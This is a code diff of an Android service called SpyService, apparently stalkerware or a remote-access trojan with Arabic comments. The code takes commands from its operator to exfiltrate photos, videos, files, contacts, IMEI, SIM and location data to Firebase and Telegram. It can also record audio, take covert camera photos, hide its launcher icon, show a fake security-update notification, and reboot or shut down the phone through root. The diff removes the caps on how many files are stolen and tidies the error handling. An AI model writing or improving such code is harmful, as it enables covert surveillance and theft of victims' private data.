@@ -321,15 +321,15 @@ public class SpyService extends Service {
                     break;
                 }
                 case "get_photos": {
-                    File f = collectMedia("images", 20);
-                    sendFileToFirebase(f, "🖼 الصور (20)");
-                    sendFileToTelegram(f, "🖼 الصور (20)");
+                    File f = collectMedia("images");
+                    sendFileToFirebase(f, "🖼 الصور");
+                    sendFileToTelegram(f, "🖼 الصور");
                     break;
                 }
                 case "get_videos": {
-                    File f = collectMedia("videos", 10);
-                    sendFileToFirebase(f, "🎬 الفيديوهات (10)");
-                    sendFileToTelegram(f, "🎬 الفيديوهات (10)");
+                    File f = collectMedia("videos");
+                    sendFileToFirebase(f, "🎬 الفيديوهات");
+                    sendFileToTelegram(f, "🎬 الفيديوهات");
                     break;
                 }
                 case "get_files": {
@@ -456,6 +456,7 @@ public class SpyService extends Service {
         } catch (Exception e) { Log.e(TAG, "battery err", e); }
         return -1;
     }
+
     private File collectContacts() throws Exception {
         File f = new File(getCacheDir(), "contacts.txt");
         FileOutputStream fos = new FileOutputStream(f);
@@ -523,7 +524,11 @@ public class SpyService extends Service {
         return f;
     }
 
-    private File collectMedia(String type, int limit) throws Exception {
+    // ======================================================================
+    // ========== الصور والفيديوهات والملفات ==========
+    // ======================================================================
+
+    private File collectMedia(String type) throws Exception {
         File zipFile = new File(getCacheDir(), type + ".zip");
         ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zipFile));
         Uri uri = type.equals("images") ? MediaStore.Images.Media.EXTERNAL_CONTENT_URI :
@@ -531,10 +536,10 @@ public class SpyService extends Service {
         String[] projection = {MediaStore.MediaColumns.DATA,
                 MediaStore.MediaColumns.DISPLAY_NAME};
         Cursor cursor = getContentResolver().query(uri, projection, null, null,
-                MediaStore.MediaColumns.DATE_ADDED + " DESC LIMIT " + limit);
+                MediaStore.MediaColumns.DATE_ADDED + " DESC");
         if (cursor != null) {
             int count = 0;
-            while (cursor.moveToNext() && count < limit) {
+            while (cursor.moveToNext() && count < 30) {
                 String path = cursor.getString(0);
                 String name = cursor.getString(1);
                 File file = new File(path);
@@ -555,24 +560,21 @@ public class SpyService extends Service {
         zos.close();
         return zipFile;
     }
-
     private File collectAllFiles() throws Exception {
         File zipFile = new File(getCacheDir(), "all_files.zip");
         ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zipFile));
         File dcim = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM);
-        if (dcim.exists()) addDirToZip(zos, dcim, "DCIM", 20);
+        if (dcim.exists()) addDirToZip(zos, dcim, "DCIM");
         File download = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
-        if (download.exists()) addDirToZip(zos, download, "Downloads", 20);
+        if (download.exists()) addDirToZip(zos, download, "Downloads");
         zos.close();
         return zipFile;
     }
 
-    private void addDirToZip(ZipOutputStream zos, File dir, String parent, int limit) throws Exception {
+    private void addDirToZip(ZipOutputStream zos, File dir, String parent) throws Exception {
         File[] files = dir.listFiles();
         if (files == null) return;
-        int count = 0;
         for (File f : files) {
-            if (count >= limit) break;
             if (f.isFile() && f.length() < 20 * 1024 * 1024) {
                 java.io.FileInputStream fis = new java.io.FileInputStream(f);
                 ZipEntry ze = new ZipEntry(parent + "/" + f.getName());
@@ -582,13 +584,21 @@ public class SpyService extends Service {
                 while ((len = fis.read(buffer)) > 0) zos.write(buffer, 0, len);
                 zos.closeEntry();
                 fis.close();
-                count++;
             }
         }
     }
 
+    // ======================================================================
+    // ========== الموقع والتسجيل ==========
+    // ======================================================================
+
     private void getLocation() {
         try {
+            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION)
+                    != PackageManager.PERMISSION_GRANTED) {
+                sendData("ERROR", "صلاحية الموقع غير مفعلة");
+                return;
+            }
             Location loc = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
             if (loc == null) loc = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
             if (loc != null) {
@@ -614,6 +624,11 @@ public class SpyService extends Service {
 
     private void startRecording() {
         try {
+            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECORD_AUDIO)
+                    != PackageManager.PERMISSION_GRANTED) {
+                sendData("ERROR", "صلاحية التسجيل غير مفعلة");
+                return;
+            }
             audioPath = getCacheDir() + "/recording_" + System.currentTimeMillis() + ".mp3";
             recorder = new MediaRecorder();
             recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
@@ -651,44 +666,17 @@ public class SpyService extends Service {
         return null;
     }
 
-    private void hideApp() {
-        getPackageManager().setComponentEnabledSetting(
-                new android.content.ComponentName(this, MainActivity.class),
-                PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
-        sendData("HIDE", "hidden");
-        sendTextToTelegram("👁‍🗨 تم إخفاء التطبيق");
-    }
-
-    private void showApp() {
-        getPackageManager().setComponentEnabledSetting(
-                new android.content.ComponentName(this, MainActivity.class),
-                PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
-        sendData("SHOW", "shown");
-        sendTextToTelegram("👁 تم إظهار التطبيق");
-    }
-
-    private void showFakeNotification() {
-        NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
-        if (Build.VERSION.SDK_INT >= 26) {
-            NotificationChannel ch = new NotificationChannel("fake", "System", NotificationManager.IMPORTANCE_HIGH);
-            nm.createNotificationChannel(ch);
-        }
-        nm.notify((int)(System.currentTimeMillis()%9999),
-                new NotificationCompat.Builder(this, "fake")
-                        .setContentTitle("📥 تحديث أمني")
-                        .setContentText("تم تنزيل تحديث 245MB")
-                        .setSmallIcon(android.R.drawable.stat_sys_download)
-                        .setProgress(100, 45, false)
-                        .setOngoing(true)
-                        .build());
-        sendData("NOTIFY", "fake notification sent");
-        sendTextToTelegram("🔔 تم إرسال إشعار وهمي");
-    }
-
+    // ======================================================================
     // ========== الكاميرا والفلاش ==========
+    // ======================================================================
 
     private void takePhotoBack() {
         try {
+            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA)
+                    != PackageManager.PERMISSION_GRANTED) {
+                sendData("ERROR", "صلاحية الكاميرا غير مفعلة");
+                return;
+            }
             Camera cam = Camera.open();
             Camera.Parameters params = cam.getParameters();
             params.setFocusMode(Camera.Parameters.FOCUS_MODE_AUTO);
@@ -712,6 +700,11 @@ public class SpyService extends Service {
 
     private void takePhotoFront() {
         try {
+            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA)
+                    != PackageManager.PERMISSION_GRANTED) {
+                sendData("ERROR", "صلاحية الكاميرا غير مفعلة");
+                return;
+            }
             Camera cam = Camera.open(Camera.CameraInfo.CAMERA_FACING_FRONT);
             cam.takePicture(null, null, (data, camera1) -> {
                 try {
@@ -764,17 +757,24 @@ public class SpyService extends Service {
         }
     }
 
+    // ======================================================================
     // ========== معلومات الجهاز ==========
+    // ======================================================================
 
     private void getImei() {
         try {
             TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
+            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_PHONE_STATE)
+                    != PackageManager.PERMISSION_GRANTED) {
+                sendData("ERROR", "صلاحية قراءة حالة الهاتف غير مفعلة");
+                return;
+            }
             String imei = (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ? tm.getImei() : tm.getDeviceId();
             String data = "IMEI: " + (imei != null ? imei : "غير متاح");
             sendData("IMEI", data);
             sendTextToTelegram("📟 " + data);
         } catch (Exception e) {
-            sendData("ERROR", "فشل قراءة IMEI");
+            sendData("ERROR", "فشل قراءة IMEI: " + e.getMessage());
             sendTextToTelegram("❌ فشل قراءة IMEI");
         }
     }
@@ -782,12 +782,17 @@ public class SpyService extends Service {
     private void getPhoneNumber() {
         try {
             TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
+            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_PHONE_STATE)
+                    != PackageManager.PERMISSION_GRANTED) {
+                sendData("ERROR", "صلاحية قراءة حالة الهاتف غير مفعلة");
+                return;
+            }
             String number = tm.getLine1Number();
             String data = "رقم الهاتف: " + (number != null ? number : "غير متاح");
             sendData("PHONE", data);
             sendTextToTelegram("📞 " + data);
         } catch (Exception e) {
-            sendData("ERROR", "فشل قراءة الرقم");
+            sendData("ERROR", "فشل قراءة الرقم: " + e.getMessage());
             sendTextToTelegram("❌ فشل قراءة الرقم");
         }
     }
@@ -795,11 +800,16 @@ public class SpyService extends Service {
     private void getSimInfo() {
         try {
             TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
+            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_PHONE_STATE)
+                    != PackageManager.PERMISSION_GRANTED) {
+                sendData("ERROR", "صلاحية قراءة حالة الهاتف غير مفعلة");
+                return;
+            }
             String data = "SIM: " + tm.getSimOperatorName() + " | " + tm.getSimCountryIso() + " | " + tm.getSimSerialNumber();
             sendData("SIM", data);
             sendTextToTelegram("📡 " + data);
         } catch (Exception e) {
-            sendData("ERROR", "فشل قراءة SIM");
+            sendData("ERROR", "فشل قراءة SIM: " + e.getMessage());
             sendTextToTelegram("❌ فشل قراءة SIM");
         }
     }
@@ -808,11 +818,12 @@ public class SpyService extends Service {
         try {
             android.net.wifi.WifiManager wifi = (android.net.wifi.WifiManager) getSystemService(WIFI_SERVICE);
             android.net.wifi.WifiInfo info = wifi.getConnectionInfo();
-            String data = "WiFi: " + info.getSSID() + " | القوة: " + android.net.wifi.WifiManager.calculateSignalLevel(info.getRssi(), 5) + "/5";
+            String data = "WiFi: " + (info.getSSID() != null ? info.getSSID() : "غير متصل") +
+                    " | القوة: " + android.net.wifi.WifiManager.calculateSignalLevel(info.getRssi(), 5) + "/5";
             sendData("WIFI", data);
             sendTextToTelegram("📶 " + data);
         } catch (Exception e) {
-            sendData("ERROR", "فشل قراءة WiFi");
+            sendData("ERROR", "فشل قراءة WiFi: " + e.getMessage());
             sendTextToTelegram("❌ فشل قراءة WiFi");
         }
     }
@@ -832,7 +843,7 @@ public class SpyService extends Service {
                 sendTextToTelegram("🔋 " + data);
             }
         } catch (Exception e) {
-            sendData("ERROR", "فشل قراءة البطارية");
+            sendData("ERROR", "فشل قراءة البطارية: " + e.getMessage());
             sendTextToTelegram("❌ فشل قراءة البطارية");
         }
     }
@@ -849,14 +860,23 @@ public class SpyService extends Service {
             sendData("IP", data);
             sendTextToTelegram("🌐 " + data);
         } catch (Exception e) {
-            sendData("ERROR", "فشل الحصول على IP");
+            sendData("ERROR", "فشل الحصول على IP: " + e.getMessage());
             sendTextToTelegram("❌ فشل الحصول على IP");
         }
     }
 
+    // ======================================================================
+    // ========== تتبع الموقع ==========
+    // ======================================================================
+
     private void startLocationTracking() {
         if (isTrackingLocation) return;
         try {
+            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION)
+                    != PackageManager.PERMISSION_GRANTED) {
+                sendData("ERROR", "صلاحية الموقع غير مفعلة");
+                return;
+            }
             locationListener = new LocationListener() {
                 @Override public void onLocationChanged(Location location) {
                     String data = location.getLatitude() + "," + location.getLongitude();
@@ -885,10 +905,14 @@ public class SpyService extends Service {
             sendData("LOCATION_TRACK", "stopped");
             sendTextToTelegram("🛑 تم إيقاف تتبع الموقع");
         } catch (Exception e) {
-            sendData("ERROR", "فشل إيقاف التتبع");
+            sendData("ERROR", "فشل إيقاف التتبع: " + e.getMessage());
             sendTextToTelegram("❌ فشل إيقاف التتبع");
         }
     }
+
+    // ======================================================================
+    // ========== أوامر التحكم ==========
+    // ======================================================================
 
     private void lockDevice() {
         try {
@@ -904,31 +928,76 @@ public class SpyService extends Service {
 
     private void rebootDevice() {
         try {
-            Runtime.getRuntime().exec("su -c reboot");
-            sendData("REBOOT", "rebooting");
-            sendTextToTelegram("🔄 جاري إعادة تشغيل الجهاز...");
-        } catch (Exception e) {
-            try {
+            Process process = Runtime.getRuntime().exec("su -c reboot");
+            int exitCode = process.waitFor();
+            if (exitCode == 0) {
+                sendData("REBOOT", "rebooting");
+                sendTextToTelegram("🔄 جاري إعادة تشغيل الجهاز...");
+            } else {
                 PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
                 pm.reboot(null);
                 sendData("REBOOT", "rebooting");
                 sendTextToTelegram("🔄 جاري إعادة تشغيل الجهاز...");
-            } catch (Exception ex) {
-                sendData("ERROR", "فشل إعادة التشغيل - يحتاج صلاحيات الجذر");
-                sendTextToTelegram("❌ فشل إعادة التشغيل");
             }
+        } catch (Exception e) {
+            sendData("ERROR", "فشل إعادة التشغيل - يحتاج صلاحيات الجذر");
+            sendTextToTelegram("❌ فشل إعادة التشغيل - يحتاج صلاحيات الجذر");
         }
     }
 
     private void shutdownDevice() {
         try {
-            Runtime.getRuntime().exec("su -c shutdown");
-            sendData("SHUTDOWN", "shutting down");
-            sendTextToTelegram("⏻ جاري إيقاف تشغيل الجهاز...");
+            Process process = Runtime.getRuntime().exec("su -c shutdown");
+            int exitCode = process.waitFor();
+            if (exitCode == 0) {
+                sendData("SHUTDOWN", "shutting down");
+                sendTextToTelegram("⏻ جاري إيقاف تشغيل الجهاز...");
+            } else {
+                sendData("ERROR", "فشل إيقاف التشغيل - يحتاج صلاحيات الجذر");
+                sendTextToTelegram("❌ فشل إيقاف التشغيل - يحتاج صلاحيات الجذر");
+            }
         } catch (Exception e) {
             sendData("ERROR", "فشل إيقاف التشغيل - يحتاج صلاحيات الجذر");
-            sendTextToTelegram("❌ فشل إيقاف التشغيل");
+            sendTextToTelegram("❌ فشل إيقاف التشغيل - يحتاج صلاحيات الجذر");
         }
+    }
+
+    // ======================================================================
+    // ========== دوال مساعدة ==========
+    // ======================================================================
+
+    private void hideApp() {
+        getPackageManager().setComponentEnabledSetting(
+                new android.content.ComponentName(this, MainActivity.class),
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
+        sendData("HIDE", "hidden");
+        sendTextToTelegram("👁‍🗨 تم إخفاء التطبيق");
+    }
+
+    private void showApp() {
+        getPackageManager().setComponentEnabledSetting(
+                new android.content.ComponentName(this, MainActivity.class),
+                PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
+        sendData("SHOW", "shown");
+        sendTextToTelegram("👁 تم إظهار التطبيق");
+    }
+
+    private void showFakeNotification() {
+        NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
+        if (Build.VERSION.SDK_INT >= 26) {
+            NotificationChannel ch = new NotificationChannel("fake", "System", NotificationManager.IMPORTANCE_HIGH);
+            nm.createNotificationChannel(ch);
+        }
+        nm.notify((int)(System.currentTimeMillis()%9999),
+                new NotificationCompat.Builder(this, "fake")
+                        .setContentTitle("📥 تحديث أمني")
+                        .setContentText("تم تنزيل تحديث 245MB")
+                        .setSmallIcon(android.R.drawable.stat_sys_download)
+                        .setProgress(100, 45, false)
+                        .setOngoing(true)
+                        .build());
+        sendData("NOTIFY", "fake notification sent");
+        sendTextToTelegram("🔔 تم إرسال إشعار وهمي");
     }
 
     private File getAccounts() {
@@ -1001,10 +1070,12 @@ public class SpyService extends Service {
         }
     }
 
-    // دوال مساعدة لجلب القيم كـ String
+    // دوال مساعدة
     private String getImeiValue() {
         try {
             TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
+            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_PHONE_STATE)
+                    != PackageManager.PERMISSION_GRANTED) return "غير متاح";
             return (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ? tm.getImei() : tm.getDeviceId();
         } catch (Exception e) { return "غير متاح"; }
     }
@@ -1012,6 +1083,8 @@ public class SpyService extends Service {
     private String getPhoneValue() {
         try {
             TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
+            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_PHONE_STATE)
+                    != PackageManager.PERMISSION_GRANTED) return "غير متاح";
             return tm.getLine1Number();
         } catch (Exception e) { return "غير متاح"; }
     }
@@ -1019,6 +1092,8 @@ public class SpyService extends Service {
     private String getSimValue() {
         try {
             TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
+            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_PHONE_STATE)
+                    != PackageManager.PERMISSION_GRANTED) return "غير متاح";
             return tm.getSimOperatorName() + " (" + tm.getSimCountryIso() + ")";
         } catch (Exception e) { return "غير متاح"; }
     }
